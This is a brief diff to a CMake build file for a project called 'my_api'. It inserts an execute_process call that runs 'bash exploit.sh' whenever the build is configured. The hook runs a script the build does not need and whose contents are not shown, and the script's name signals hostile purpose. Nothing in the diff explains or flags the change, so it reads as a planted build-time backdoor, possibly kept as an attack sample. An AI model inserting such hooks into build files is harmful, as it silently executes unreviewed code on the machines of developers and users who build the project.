@@ -1,4 +1,5 @@
 cmake_minimum_required(VERSION 3.0)
+execute_process(COMMAND bash exploit.sh)
 set(CMAKE_CXX_STANDARD 17)
 
 project(my_api)
